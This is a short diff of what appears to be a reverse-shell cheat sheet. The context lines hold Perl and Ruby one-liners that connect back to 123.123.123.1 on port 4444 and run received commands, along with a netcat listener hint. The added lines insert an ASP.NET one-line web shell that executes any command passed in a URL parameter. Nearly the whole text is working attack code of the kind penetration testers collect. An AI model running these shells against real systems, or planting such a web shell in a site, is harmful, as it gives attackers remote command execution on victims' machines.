@@ -29,3 +29,7 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:4444");STDIN->fdop
 ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
 #You can listen for connections on nc -lnvp 1234 for example
+
+#ASP.net oneline shell, thanks to Seguranca-informatica
+#Call by issuing: http://123.123.123.1/shell.asp?cmd=dir
+<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
